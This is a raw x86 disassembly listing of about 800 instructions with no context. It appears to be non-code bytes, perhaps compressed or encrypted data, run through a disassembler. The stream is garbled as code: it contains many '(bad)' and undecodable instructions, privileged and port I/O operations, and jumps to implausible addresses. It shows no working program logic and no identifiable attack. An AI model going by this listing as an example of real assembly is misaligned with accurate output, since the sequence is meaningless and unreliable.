  4a068f:	cmp    DWORD PTR ds:0xa9bc5705,ecx
  4a0695:	push   ebp
  4a0696:	(bad)  
  4a0697:	daa    
  4a0698:	push   0xffffff88
  4a069a:	adc    BYTE PTR [esi+0x21353cd3],ch
  4a06a0:	in     al,0xc
  4a06a2:	add    eax,DWORD PTR [ebx]
  4a06a4:	push   es
  4a06a5:	sar    BYTE PTR [ecx*8+0x4040202],1
  4a06ac:	sbb    ah,BYTE PTR [ecx]
  4a06ae:	ret    0xbc05
  4a06b1:	mov    BYTE PTR [eax+0x5],cl
  4a06b4:	(bad)  
  4a06b6:	mov    bh,0x55
  4a06b8:	fcomp  DWORD PTR ds:0x25410841
  4a06be:	cmp    BYTE PTR [ecx],0xff
  4a06c1:	and    esp,DWORD PTR [ebx+ebp*1]
  4a06c4:	sbb    edx,DWORD PTR [ebx]
  4a06c6:	ror    DWORD PTR [eax-0x17e323a6],0xe
  4a06cd:	add    al,0x31
  4a06cf:	mov    eax,ds:0x3546454
  4a06d4:	cmp    al,0xfa
  4a06d7:	push   ds
  4a06d8:	cmp    ecx,DWORD PTR ds:0xb5611651
  4a06de:	mov    esi,0x49126ad5
  4a06e3:	or     BYTE PTR [esi],al
  4a06e5:	dec    ecx
  4a06e6:	retf   0xfa75
  4a06e9:	ret    
  4a06ea:	push   edx
  4a06eb:	sbb    DWORD PTR [edx],ebp
  4a06ed:	cmp    BYTE PTR [edi-0x3d],bl
  4a06f0:	or     eax,0xba40f100
  4a06f5:	cld    
  4a06f6:	dec    esi
  4a06f7:	adc    edx,DWORD PTR [eax+ebx*1]
  4a06fa:	es int3 
  4a06fc:	add    al,0xbb
  4a06fe:	or     al,0xb3
  4a0700:	sub    eax,0xc7ebc14e
  4a0705:	or     BYTE PTR ds:[ecx+0x6b07100d],dl
  4a070c:	jge    0x4a0721
  4a070e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a070f:	imul   ebx,DWORD PTR [esi-0x32788eda],0x4d
  4a0716:	(bad)  
  4a0717:	leave  
  4a0718:	add    eax,0x11080904
  4a071d:	adc    cl,BYTE PTR [ebx]
  4a071f:	scas   eax,DWORD PTR es:[edi]
  4a0720:	sbb    eax,DWORD PTR [ebx+0x2720fc7e]
  4a0726:	push   ebp
  4a0727:	sbb    al,0x96
  4a0729:	mov    esi,DWORD PTR [eax]
  4a072b:	push   ecx
  4a072c:	dec    ebx
  4a072d:	push   edx
  4a072e:	inc    eax
  4a072f:	sbb    DWORD PTR es:[eax+0x5b],esi
  4a0733:	sbb    esi,DWORD PTR [eax]
  4a0735:	pop    ecx
  4a0736:	xabort 0x5
  4a0739:	pop    edi
  4a073a:	and    DWORD PTR [ebx+0x53bbd466],esp
  4a0740:	scas   eax,DWORD PTR es:[edi]
  4a0741:	ror    DWORD PTR [eax+0x60],cl
  4a0744:	or     al,0xc4
  4a0746:	sub    esp,DWORD PTR [eax]
  4a0748:	scas   al,BYTE PTR es:[edi]
  4a0749:	sbb    ebx,DWORD PTR [edx]
  4a074b:	add    esi,edx
  4a074d:	pop    ds
  4a074e:	push   esi
  4a074f:	stc    
  4a0750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a0751:	fidiv  DWORD PTR [edx]
  4a0753:	pop    ds
  4a0754:	adc    eax,0x56372119
  4a0759:	or     BYTE PTR [eax],bl
  4a075b:	or     BYTE PTR [edi-0x3f],bl
  4a075e:	mov    ebp,es
  4a0760:	punpckldq mm6,DWORD PTR [ebx+0x40]
  4a0764:	sub    al,0x40
  4a0766:	and    BYTE PTR [ebp-0x47],ch
  4a0769:	lea    eax,[ebx+0x4110c331]
  4a076f:	les    ecx,FWORD PTR [esi]
  4a0771:	pop    ss
  4a0772:	pop    esi
  4a0773:	sbb    DWORD PTR [ecx],ecx
  4a0775:	les    eax,FWORD PTR [esi+0x766f132d]
  4a077b:	outs   dx,DWORD PTR ds:[esi]
  4a077c:	add    al,0x7e
  4a077e:	adc    DWORD PTR [ebx+0x306733c],ecx
  4a0784:	ret    0x389
  4a0787:	rcr    DWORD PTR [edx-0x48],0xd9
  4a078b:	fcom   DWORD PTR [ebp+0x777f3c3a]
  4a0791:	adc    DWORD PTR [edi],edi
  4a0793:	jns    0x4a0724
  4a0795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a0796:	cmp    al,0xdf
  4a0798:	sbb    BYTE PTR [edx],al
  4a079a:	mov    cl,0xef
  4a079c:	cmp    cl,al
  4a079e:	(bad)  
  4a079f:	jae    0x4a07a4
  4a07a1:	js     0x4a0769
  4a07a3:	test   BYTE PTR [ecx+0x503091b7],bl
  4a07a9:	pop    eax
  4a07aa:	mov    BYTE PTR [edx],ah
  4a07ac:	jmp    0x4a1a4a4e
  4a07b1:	xchg   ebx,eax
  4a07b2:	cmp    eax,0xbc2cb161
  4a07b7:	js     0x4a07f9
  4a07b9:	mov    WORD PTR [ebp+0x3b],?
  4a07bc:	std    
  4a07bd:	test   BYTE PTR [edi+0x18bb765],cl
  4a07c3:	or     al,0x2e
  4a07c5:	mov    edx,DWORD PTR [eax]
  4a07c7:	pop    edx
  4a07c8:	js     0x4a0765
  4a07ca:	or     DWORD PTR ds:0xca0e862b,esi
  4a07d0:	push   ss
  4a07d1:	aas    
  4a07d2:	sbb    ebp,DWORD PTR [eax-0x45ef6f72]
  4a07d8:	(bad)  
  4a07d9:	xor    eax,0xe910328f
  4a07de:	es jae 0x4a082a
  4a07e1:	or     eax,0x72b41d2d
  4a07e6:	sbb    BYTE PTR [eax-0x52],dl
  4a07e9:	pop    ss
  4a07ea:	jno    0x4a07cd
  4a07ec:	scas   al,BYTE PTR es:[edi]
  4a07ed:	pop    ss
  4a07ee:	sbb    cl,BYTE PTR [ebx]
  4a07f0:	mov    eax,ds:0x1a08f212
  4a07f5:	dec    esp
  4a07f6:	js     0x4a078a
  4a07f8:	fisub  WORD PTR [eax]
  4a07fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a07fb:	or     BYTE PTR [esi],al
  4a07fd:	or     dh,dh
  4a07ff:	or     al,0x10
  4a0801:	xchg   edi,eax
  4a0802:	xchg   esi,eax
  4a0803:	jbe    0x4a07f6
  4a0805:	and    DWORD PTR [ebx],esi
  4a0807:	adc    DWORD PTR [esi-0x35],eax
  4a080a:	pusha  
  4a080b:	and    BYTE PTR [edx-0x57],dh
  4a080e:	mov    esp,cr3
  4a0811:	pusha  
  4a0812:	pop    edx
  4a0813:	push   edx
  4a0814:	xchg   ebp,eax
  4a0815:	jmp    0x4a082d
  4a0817:	or     BYTE PTR [ebp+eiz*4+0x52b11451],dh
  4a081e:	xor    DWORD PTR [eax+ebp*8+0x3b],ecx
  4a0822:	pop    es
  4a0823:	inc    esp
  4a0824:	sbb    BYTE PTR [eax],ch
  4a0826:	add    al,0xb1
  4a0828:	xchg   dl,al
  4a082a:	add    eax,0xf468cc7d
  4a082f:	push   ebp
  4a0830:	retf   
  4a0831:	rol    edx,0xb2
  4a0834:	fiadd  WORD PTR [ebx]
  4a0836:	ss popa 
  4a0838:	xor    ch,al
  4a083a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a083b:	xchg   esi,eax
  4a083c:	and    al,BYTE PTR [ecx-0x22fba888]
  4a0842:	sbb    eax,DWORD PTR [ecx+0x2c]
  4a0845:	clc    
  4a0846:	pop    ebp
  4a0847:	xlat   BYTE PTR ds:[ebx]
  4a0848:	sbb    BYTE PTR [esi-0x73],bl
  4a084b:	inc    ebx
  4a084c:	add    ebx,DWORD PTR [ebx+0x41]
  4a084f:	data16 arpl WORD PTR [esp+ebp*4+0x3e],bp
  4a0854:	mov    ds:0x2fb4b672,al
  4a0859:	push   edx
  4a085a:	into   
  4a085b:	rcr    ch,1
  4a085d:	push   ds
  4a085e:	inc    edx
  4a085f:	add    al,0x43
  4a0861:	inc    esi
  4a0862:	xor    al,0xc6
  4a0864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a0865:	or     ebx,DWORD PTR [ebp-0x59f071f4]
  4a086b:	xor    bl,BYTE PTR [esi-0x4a]
  4a086e:	cli    
  4a086f:	push   ebx
  4a0870:	and    DWORD PTR [ebx-0x1bc08250],eax
  4a0876:	and    al,0x6a
  4a0878:	inc    ebx
  4a0879:	retf   
  4a087a:	add    al,0xec
  4a087c:	xor    al,0xf8
  4a087e:	mov    BYTE PTR [eax+0x45],bl
  4a0881:	inc    edi
  4a0882:	push   cs
  4a0883:	cmp    eax,0x71354736
  4a0888:	fcmovu st,st(2)
  4a088a:	cmp    bh,bl
  4a088c:	and    BYTE PTR [esi-0x80],cl
  4a088f:	add    BYTE PTR [edx],cl
  4a0891:	sbb    BYTE PTR [ebx],0x4c
  4a0894:	dec    esp
  4a0895:	jle    0x4a0895
  4a0897:	hlt    
  4a0898:	jle    0x4a08bf
  4a089a:	lock dec edx
  4a089c:	js     0x4a0877
  4a089e:	jo     0x4a08fe
  4a08a0:	jne    0x4a089b
  4a08a2:	xchg   edi,eax
  4a08a3:	lock and BYTE PTR [eax+0x3640f611],ch
  4a08aa:	push   cs
  4a08ab:	inc    eax
  4a08ac:	cmc    
  4a08ad:	xor    BYTE PTR [eax-0x43],0x60
  4a08b1:	sub    eax,0x7770ce49
  4a08b6:	xchg   ecx,eax
  4a08b7:	mov    DWORD PTR [edi+0x8471d8c],edx
  4a08bd:	jl     0x4a08a6
  4a08bf:	data16 hlt 
  4a08c1:	dec    edx
  4a08c2:	add    BYTE PTR [eax-0x63148fb8],ah
  4a08c8:	cs add esp,ebp
  4a08cb:	or     al,0x37
  4a08cd:	out    dx,eax
  4a08ce:	sub    eax,0xfba5650b
  4a08d3:	add    bx,WORD PTR [edi*2+0x730d68f0]
  4a08db:	ficomp DWORD PTR [edx-0x2bdda7e3]
  4a08e1:	push   esi
  4a08e2:	ds ret 
  4a08e4:	push   ebx
  4a08e5:	rcl    BYTE PTR [ecx+0x1b],1
  4a08e8:	and    al,0x93
  4a08ea:	adc    DWORD PTR [ebx-0x39],0x0
  4a08ee:	arpl   WORD PTR [edx+0xa],cx
  4a08f1:	mov    esp,0x76053c7e
  4a08f6:	pop    edi
  4a08f7:	pop    eax
  4a08f8:	cmp    BYTE PTR [eax+0x425689c6],cl
  4a08fe:	adc    DWORD PTR [esp+edi*2],edx
  4a0901:	das    
  4a0902:	ret    0xb353
  4a0905:	lock data16 or BYTE PTR [ebx+ebp*4],cl
  4a090a:	js     0x4a0972
  4a090c:	je     0x4a0966
  4a090e:	mov    eax,esi
  4a0910:	jmp    0x8751c92a
  4a0915:	fdivr  QWORD PTR [edx]
  4a0917:	je     0x4a0934
  4a0919:	inc    edi
  4a091a:	adc    BYTE PTR [ecx],0xdc
  4a091d:	push   esp
  4a091e:	jl     0x4a099e
  4a0920:	jle    0x4a0997
  4a0922:	out    dx,eax
  4a0923:	xor    ecx,DWORD PTR [eax]
  4a0925:	ds sub al,0xce
  4a0928:	push   ecx
  4a0929:	push   0x224ae68
  4a092e:	push   ecx
  4a092f:	xlat   BYTE PTR ds:[ebx]
  4a0930:	pop    ds
  4a0931:	add    DWORD PTR [esi+edx*2-0x2fa9ae07],0xa7702106
  4a093c:	inc    edi
  4a093d:	cmp    al,0x7d
  4a093f:	dec    esp
  4a0940:	mov    al,ds:0xc97da84d
  4a0945:	call   0x465ce054
  4a094a:	pop    eax
  4a094b:	push   cs
  4a094c:	ret    0xea56
  4a094f:	aam    0x38
  4a0951:	adc    DWORD PTR [ebp-0x11],0x15752cf9
  4a0958:	mov    esi,0x2e180b2e
  4a095d:	dec    esi
  4a095e:	mov    esi,0x1cf5192c
  4a0963:	in     al,dx
  4a0964:	jecxz  0x4a0996
  4a0966:	inc    ecx
  4a0967:	adc    al,0x4a
  4a0969:	dec    edx
  4a096a:	push   es
  4a096b:	and    al,0x9c
  4a096d:	adc    DWORD PTR [ecx],0x24bcc9af
  4a0973:	loopne 0x4a0987
  4a0975:	mov    ecx,esp
  4a0977:	rol    BYTE PTR [eax],cl
  4a0979:	push   0x4e57f206
  4a097e:	loop   0x4a0947
  4a0980:	scas   al,BYTE PTR es:[edi]
  4a0981:	adc    eax,0x1c4eb679
  4a0986:	inc    esp
  4a0987:	js     0x4a09b1
  4a0989:	sar    DWORD PTR [edx],1
  4a098b:	or     ch,BYTE PTR [ecx+0x37f5866]
  4a0991:	cwde   
  4a0992:	push   0x3
  4a0994:	sbb    eax,0x95128a81
  4a0999:	mov    es,WORD PTR [ebp+0x5d]
  4a099c:	ror    DWORD PTR ds:0x4cfcd8b3,0x91
  4a09a3:	fucomp st(1)
  4a09a5:	sbb    DWORD PTR [eax-0xb2f6354],eax
  4a09ab:	dec    eax
  4a09ac:	mov    ds:0x4a8f90a1,eax
  4a09b1:	add    BYTE PTR [ecx],ch
  4a09b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a09b4:	neg    DWORD PTR [eax+0x30]
  4a09b7:	jle    0x4a09f4
  4a09b9:	xchg   ebp,eax
  4a09ba:	pop    eax
  4a09bb:	arpl   WORD PTR [ebx+0x48],si
  4a09be:	xchg   eax,esi
  4a09c0:	in     eax,dx
  4a09c1:	xor    DWORD PTR [edx+ebx*8+0x7b],0x66
  4a09c6:	in     eax,dx
  4a09c7:	in     eax,0x74
  4a09c9:	pop    ds
  4a09ca:	cmc    
  4a09cb:	icebp  
  4a09cc:	mov    DWORD PTR [edx+0x5b],0xfb6a47ca
  4a09d3:	jb     0x4a096f
  4a09d5:	pop    edi
  4a09d6:	pop    ebx
  4a09d7:	fldcw  WORD PTR [eax+0x7b]
  4a09da:	or     DWORD PTR [ecx],edx
  4a09dc:	mov    eax,ds:0x151a3c3d
  4a09e1:	in     al,0x7a
  4a09e3:	mov    cl,0x33
  4a09e5:	cmc    
  4a09e6:	outs   dx,WORD PTR ds:[esi]
  4a09e8:	loopne 0x4a0a4e
  4a09ea:	adc    eax,0x832d9c14
  4a09ef:	mov    ah,0x1f
  4a09f1:	rol    ebx,1
  4a09f3:	add    dh,0x75
  4a09f6:	sbb    edx,DWORD PTR [edi-0x3c]
  4a09f9:	call   0x410ad0df
  4a09fe:	enter  0x905e,0x49
  4a0a02:	lock or esi,DWORD PTR [edi+0x751e40e1]
  4a0a09:	pop    ebp
  4a0a0a:	add    BYTE PTR [ecx],bl
  4a0a0c:	mov    BYTE PTR [edi+0x2eff4f3e],dl
  4a0a12:	wbinvd 
  4a0a14:	pop    esp
  4a0a15:	jo     0x4a0a83
  4a0a17:	bound  ecx,QWORD PTR [ebx+0x55323d8]
  4a0a1d:	xchg   ecx,eax
  4a0a1e:	sbb    eax,0x5657b44c
  4a0a23:	stos   DWORD PTR es:[edi],eax
  4a0a24:	mov    BYTE PTR [esi+0x790a152d],ah
  4a0a2a:	repnz lds ecx,FWORD PTR [eax]
  4a0a2d:	mov    ah,0xb4
  4a0a2f:	lds    eax,FWORD PTR [eax]
  4a0a31:	pop    eax
  4a0a32:	jo     0x4a0a3c
  4a0a34:	dec    ebx
  4a0a35:	adc    BYTE PTR [eax],al
  4a0a37:	xor    BYTE PTR [esi],al
  4a0a39:	dec    edi
  4a0a3a:	in     al,dx
  4a0a3b:	inc    edi
  4a0a3c:	dec    eax
  4a0a3d:	jne    0x4a0a80
  4a0a3f:	dec    esi
  4a0a40:	xchg   ebx,eax
  4a0a41:	adc    bl,BYTE PTR [edx-0x31]
  4a0a44:	xor    al,0xf0
  4a0a46:	into   
  4a0a47:	test   BYTE PTR [esi],cl
  4a0a49:	jmp    0x1692a86b
  4a0a4e:	clc    
  4a0a4f:	into   
  4a0a50:	push   0xa
  4a0a52:	push   ds
  4a0a53:	inc    eax
  4a0a54:	xor    ebp,DWORD PTR [eax]
  4a0a56:	mov    al,ds:0xd3e1b035
  4a0a5b:	push   ebx
  4a0a5c:	shl    BYTE PTR [eax+ebp*1+0x5f],0x13
  4a0a61:	mov    fs,WORD PTR [eax-0x53d79eae]
  4a0a67:	inc    ebp
  4a0a68:	fwait
  4a0a69:	scas   eax,DWORD PTR es:[edi]
  4a0a6a:	or     BYTE PTR [edx+0x1783870f],dl
  4a0a70:	push   eax
  4a0a71:	adc    al,0x13
  4a0a73:	sbb    DWORD PTR [edi],ebx
  4a0a75:	es (bad) 
  4a0a77:	or     BYTE PTR fs:[edi],bh
  4a0a7a:	push   edi
  4a0a7b:	adc    DWORD PTR [eax+0x5c],esp
  4a0a7e:	add    al,0xc3
  4a0a80:	push   es
  4a0a81:	add    edi,DWORD PTR [eax]
  4a0a83:	push   ebx
  4a0a84:	pop    ss
  4a0a85:	pop    ebx
  4a0a86:	or     al,0xdd
  4a0a88:	xor    eax,0x1f17d118
  4a0a8d:	retf   
  4a0a8e:	xor    BYTE PTR [ebx],bl
  4a0a90:	pop    es
  4a0a91:	out    0x1a,eax
  4a0a93:	add    bl,BYTE PTR [ecx]
  4a0a95:	es lock dec ebp
  4a0a98:	or     al,0x69
  4a0a9a:	mov    fs,eax
  4a0a9c:	mov    al,0x51
  4a0a9e:	push   eax
  4a0a9f:	in     eax,0x12
  4a0aa1:	mov    al,0x63
  4a0aa3:	xor    DWORD PTR [edx+0x5113e314],0x92a1802d
  4a0aad:	sbb    ecx,DWORD PTR fs:[edi+0x2e]
  4a0ab1:	sub    BYTE PTR [ebx-0x2e],al
  4a0ab4:	adc    al,cl
  4a0ab6:	adc    eax,DWORD PTR [ebp+0x63]
  4a0ab9:	imul   ebx,DWORD PTR [eax+eiz*2+0x6397841c],0x6b715d5b
  4a0ac4:	imul   ebp,DWORD PTR [ecx+eiz*2+0xb],0x46
  4a0ac9:	iret   
  4a0aca:	add    BYTE PTR [edi],bh
  4a0acc:	or     DWORD PTR [eax+0x66],ebp
  4a0acf:	ins    BYTE PTR es:[edi],dx
  4a0ad0:	fadd   st(0),st
  4a0ad2:	sub    BYTE PTR [esi],dl
  4a0ad4:	fs jg  0x4a0aa7
  4a0ad7:	adc    al,0x16
  4a0ad9:	pushf  
  4a0ada:	pop    ebx
  4a0adb:	dec    eax
  4a0adc:	mov    ecx,0xae956f73
  4a0ae1:	sub    ebp,0xfffffff9
  4a0ae4:	xchg   DWORD PTR [eax],edx
  4a0ae6:	imul   ecx,DWORD PTR [edx-0x4d],0x4e
  4a0aea:	adc    DWORD PTR [eax+ecx*2],ebp
  4a0aed:	cs sub al,0xb4
  4a0af0:	(bad)  
  4a0af2:	cmp    BYTE PTR [ecx-0x38],0x89
  4a0af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0af7:	inc    edi
  4a0af8:	or     al,0x85
  4a0afa:	jbe    0x4a0ae4
  4a0afc:	sbb    al,0x6b
  4a0afe:	jecxz  0x4a0b38
  4a0b00:	dec    ebp
  4a0b01:	adc    BYTE PTR ds:0x8108b8f8,cl
  4a0b07:	xor    eax,0x56522030
  4a0b0c:	xchg   edi,eax
  4a0b0d:	sub    eax,0x55b60a8
  4a0b12:	clc    
  4a0b13:	and    al,0xdd
  4a0b15:	mov    ebp,0x5356a8d8
  4a0b1a:	xor    DWORD PTR [eax+0x7b70fb5a],edx
  4a0b20:	es ret 
  4a0b22:	pop    ebx
  4a0b23:	lods   eax,DWORD PTR ds:[esi]
  4a0b24:	mov    WORD PTR [edi+eax*1+0x30],?
  4a0b28:	inc    eax
  4a0b29:	lds    ebp,FWORD PTR [ebp+0x315cf0f0]
  4a0b2f:	inc    eax
  4a0b30:	cld    
  4a0b31:	mov    BYTE PTR [eax+0x50],0x7b
  4a0b35:	inc    esi
  4a0b36:	loop   0x4a0b7a
  4a0b38:	fadd   DWORD PTR [ebp-0x9]
  4a0b3b:	aas    
  4a0b3c:	adc    al,0x56
  4a0b3e:	shr    DWORD PTR [esi],0xf1
  4a0b41:	lods   eax,DWORD PTR ds:[esi]
  4a0b42:	adc    eax,0xff43e02f
  4a0b47:	inc    eax
  4a0b48:	mov    BYTE PTR [ebp+0x20],al
  4a0b4b:	mov    BYTE PTR ds:0xfc7a220e,0x8a
  4a0b52:	daa    
  4a0b53:	dec    eax
  4a0b54:	add    DWORD PTR [edx-0x63],eax
  4a0b57:	jne    0x4a0b79
  4a0b59:	and    DWORD PTR [ecx-0x27],ebx
  4a0b5c:	call   0xed376e8
  4a0b61:	lahf   
  4a0b62:	push   esi
  4a0b63:	add    al,0x4e
  4a0b65:	or     BYTE PTR [ebx+0x5fe90f7a],cl
  4a0b6b:	aam    0x63
  4a0b6d:	loope  0x4a0b71
  4a0b6f:	xor    bh,ah
  4a0b71:	int    0x74
  4a0b73:	fmul   DWORD PTR [ebx-0x5a8fb3a]
  4a0b79:	add    esp,ecx
  4a0b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a0b7c:	push   edx
  4a0b7d:	inc    esp
  4a0b7e:	js     0x4a0b35
  4a0b80:	jl     0x4a0bba
  4a0b82:	arpl   WORD PTR [edx+0x74],si
  4a0b85:	jae    0x4a0bb7
  4a0b87:	and    DWORD PTR [ecx],esp
  4a0b89:	xor    esp,DWORD PTR [edi+0x74]
  4a0b8c:	test   al,0x7c
  4a0b8e:	and    ecx,DWORD PTR [esi+0xf]
  4a0b91:	mov    bl,cl
  4a0b93:	push   eax
  4a0b94:	mov    eax,0x5cb1da4
  4a0b99:	out    dx,al
  4a0b9a:	call   0xdc5306c3
  4a0b9f:	inc    edi
  4a0ba0:	inc    esp
  4a0ba1:	and    esp,DWORD PTR [eax]
  4a0ba3:	mov    eax,0x5efaac13
  4a0ba8:	ins    BYTE PTR es:[edi],dx
  4a0ba9:	imul   ebp,DWORD PTR [eax+0x58],0x5b8b7275
  4a0bb0:	mov    edx,0xf5215120
  4a0bb5:	int    0x13
  4a0bb7:	xchg   ebp,eax
  4a0bb8:	ror    DWORD PTR [edi],0x88
  4a0bbb:	or     BYTE PTR [ebp-0x444a4d4f],ch
  4a0bc1:	and    BYTE PTR [ecx-0x7af036c6],al
  4a0bc7:	xor    al,0x17
  4a0bc9:	loopne 0x4a0bdc
  4a0bcb:	sub    dh,BYTE PTR [esi]
  4a0bcd:	mov    eax,0x885663a
  4a0bd2:	jnp    0x4a0b5f
  4a0bd4:	push   ss
  4a0bd5:	mov    bh,BYTE PTR [eax+0x3081117]
  4a0bdb:	xlat   BYTE PTR ds:[ebx]
  4a0bdc:	mov    ecx,0xda683013
  4a0be1:	pusha  
  4a0be2:	test   al,0x64
  4a0be4:	or     ebp,DWORD PTR [edi+0x58750ba8]
  4a0bea:	daa    
  4a0beb:	sbb    DWORD PTR [esp+eiz*2],0x58c2700f
  4a0bf2:	les    edi,FWORD PTR [esp+edi*1-0x2c]
  4a0bf6:	and    ah,al
  4a0bf8:	mov    al,0x40
  4a0bfa:	into   
  4a0bfb:	pop    ss
  4a0bfc:	outs   dx,DWORD PTR ds:[esi]
  4a0bfd:	and    eax,0xa1b590b2
  4a0c02:	mov    ecx,0x824dc493
  4a0c07:	fstp   QWORD PTR [esi]
  4a0c09:	mov    WORD PTR [edx+0x6880108d],?
  4a0c0f:	add    esi,ebp
  4a0c11:	ins    BYTE PTR es:[edi],dx
  4a0c12:	mov    ebx,0x1442c080
  4a0c17:	(bad)  
  4a0c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0c19:	in     al,dx
  4a0c1a:	and    edx,DWORD PTR [esi]
  4a0c1c:	(bad)  
  4a0c1d:	fidivr DWORD PTR [esi+0x7]
  4a0c20:	pop    esp
  4a0c21:	add    edx,edx
  4a0c23:	mov    DWORD PTR [edi+edx*8+0x8],eax
  4a0c27:	jnp    0x4a0c48
  4a0c29:	or     BYTE PTR [ebp+0x1210ac75],ah
  4a0c2f:	pop    edx
  4a0c30:	scas   al,BYTE PTR es:[edi]
  4a0c31:	push   es
  4a0c32:	loope  0x4a0bc8
  4a0c34:	mov    eax,ds:0xd0143aef
  4a0c39:	push   ds
  4a0c3a:	and    DWORD PTR [esi],esp
  4a0c3c:	mov    ah,0x45
  4a0c3e:	out    0x1c,al
  4a0c40:	xor    ah,ah
  4a0c42:	xor    al,0x20
  4a0c44:	(bad)  
  4a0c45:	fidivr WORD PTR [ebx]
  4a0c47:	ret    
  4a0c48:	mov    dl,0xa1
  4a0c4a:	aad    0x83
  4a0c4c:	dec    eax
  4a0c4d:	push   0x49076d27
  4a0c52:	lahf   
  4a0c53:	iret   
  4a0c54:	data16 mov BYTE PTR [ebp+ebx*2+0x43d9b418],0xe1
  4a0c5d:	enter  0x4e43,0xc
  4a0c61:	and    BYTE PTR [esp+ebx*8+0x56168104],0x10
  4a0c69:	pusha  
  4a0c6a:	pop    ebp
  4a0c6b:	cli    
  4a0c6c:	xor    BYTE PTR [eax],cl
  4a0c6e:	or     al,0xee
  4a0c70:	test   al,0xb2
  4a0c72:	dec    DWORD PTR [esi]
  4a0c74:	jno    0x4a0ce1
  4a0c76:	pop    ebp
  4a0c77:	cmp    eax,0x33d1205
  4a0c7c:	inc    edx
  4a0c7d:	adc    DWORD PTR [ecx],esi
  4a0c7f:	add    ebx,DWORD PTR [ebp+0x52]
  4a0c82:	(bad)  
  4a0c83:	sar    DWORD PTR [eax-0x6df7b959],0x3
  4a0c8a:	pop    ebx
  4a0c8b:	ins    DWORD PTR es:[edi],dx
  4a0c8c:	pop    edi
  4a0c8d:	push   ebx
  4a0c8e:	inc    ecx
  4a0c8f:	enter  0x9264,0x89
  4a0c93:	fs push ds
  4a0c95:	jno    0x4a0cb6
  4a0c97:	mov    BYTE PTR cs:[ebp-0x54],0xa1
  4a0c9c:	jb     0x4a0cf1
  4a0c9e:	push   esi
  4a0c9f:	add    ah,BYTE PTR [ebx-0x66]
  4a0ca2:	ins    DWORD PTR es:[edi],dx
  4a0ca3:	pop    ebp
  4a0ca4:	sub    DWORD PTR [eax-0x6371edee],esp
  4a0caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0cab:	loop   0x4a0c8b
  4a0cad:	mov    al,dl
  4a0caf:	push   es
  4a0cb0:	fdiv   DWORD PTR [edi+0x5]
  4a0cb3:	lock push ds
  4a0cb5:	add    eax,DWORD PTR [esi-0x5d]
  4a0cb8:	fst    QWORD PTR [esi+0x21427476]
  4a0cbe:	or     eax,DWORD PTR [edx]
  4a0cc0:	mov    esi,0xafe05c04
  4a0cc5:	cmp    eax,0x7898da95
  4a0cca:	clc    
  4a0ccb:	hlt    
  4a0ccc:	push   esi
  4a0ccd:	mov    ebp,0xa5f8c45c
  4a0cd2:	and    DWORD PTR [ebp-0xd],0x51014e3a
  4a0cd9:	push   edi
  4a0cda:	sub    ebp,DWORD PTR [ecx-0x5866c841]
  4a0ce0:	inc    eax
  4a0ce1:	dec    DWORD PTR [esi*2+0x6d06fba6]
  4a0ce8:	mov    cl,0x71
  4a0cea:	and    al,bl
  4a0cec:	mov    eax,0xbc019c3
  4a0cf1:	sub    DWORD PTR [eax-0x20],0xfffffff8
  4a0cf5:	or     DWORD PTR [eax+0x76],eax
  4a0cf8:	popa   
  4a0cf9:	std    
  4a0cfa:	adc    dl,dh
  4a0cfc:	cmp    BYTE PTR [ebx-0x4c35bcab],0xc
  4a0d03:	aam    0xb4
  4a0d05:	retf   
  4a0d06:	push   edi
  4a0d07:	mov    bl,0xf0
  4a0d09:	and    ebp,DWORD PTR [ebx-0x76]
  4a0d0c:	sti    
  4a0d0d:	gs mov bh,0x87
  4a0d10:	jno    0x4a0d7f
  4a0d12:	mov    gs,WORD PTR [edx+0x1f]
  4a0d15:	sub    al,0x73
  4a0d17:	inc    ebx
  4a0d18:	clc    
  4a0d19:	imul   ecx,DWORD PTR [edx],0x274dcacf
  4a0d1f:	nop
  4a0d20:	pop    es
  4a0d21:	push   esi
  4a0d22:	xchg   ebp,eax
  4a0d23:	call   DWORD PTR [ebx-0x15]
  4a0d26:	add    DWORD PTR [ecx+0x6b],0x21
  4a0d2a:	push   edi
  4a0d2b:	not    BYTE PTR [esi]
  4a0d2d:	rcr    BYTE PTR ds:[edi-0x2e],0x76
  4a0d32:	fnstcw WORD PTR [ebx+0xc]
  4a0d35:	jmp    0x4a0d59
  4a0d37:	fimul  WORD PTR [edi+0x8]
  4a0d3a:	push   ds
  4a0d3b:	dec    esi
  4a0d3c:	sti    
  4a0d3d:	pushf  
  4a0d3e:	mov    ah,0x6c
  4a0d40:	mov    ebx,DWORD PTR [esi-0x47]
  4a0d43:	push   cs
  4a0d44:	aas    
  4a0d45:	int3   
  4a0d46:	pop    esp
  4a0d47:	mov    ebp,0x58492a1
  4a0d4c:	xchg   ecx,eax
  4a0d4d:	pushf  
  4a0d4e:	xor    ebp,DWORD PTR [edx+0x6f6016d]
  4a0d54:	add    BYTE PTR [ecx],al
  4a0d56:	add    DWORD PTR ds:0x47792a01,ebp
  4a0d5c:	rcr    BYTE PTR [eax+ebp*2-0x342e7e6a],0xd8
  4a0d64:	mov    ch,0xf7
  4a0d66:	and    esp,DWORD PTR [ebx]
  4a0d68:	mov    bh,0x75
  4a0d6a:	add    al,0xe3
  4a0d6c:	neg    BYTE PTR [eax+ecx*1]
  4a0d6f:	pop    eax
  4a0d70:	rcr    BYTE PTR [eax],cl
  4a0d72:	cmp    BYTE PTR [ebp+0x18],cl
  4a0d75:	adc    al,0x9a
  4a0d77:	xchg   BYTE PTR [edi-0x33e0fc6f],al
  4a0d7d:	jmp    0x1122:0x18539aee
  4a0d84:	outs   dx,DWORD PTR ds:[esi]
  4a0d85:	sbb    edx,DWORD PTR [esi+eax*1-0x57]
  4a0d89:	dec    esp
  4a0d8a:	fld    TBYTE PTR [edi+0x5f]
  4a0d8d:	adc    BYTE PTR [eax],dl
  4a0d8f:	adc    dl,dh
  4a0d91:	out    dx,al
  4a0d92:	outs   dx,BYTE PTR ds:[esi]
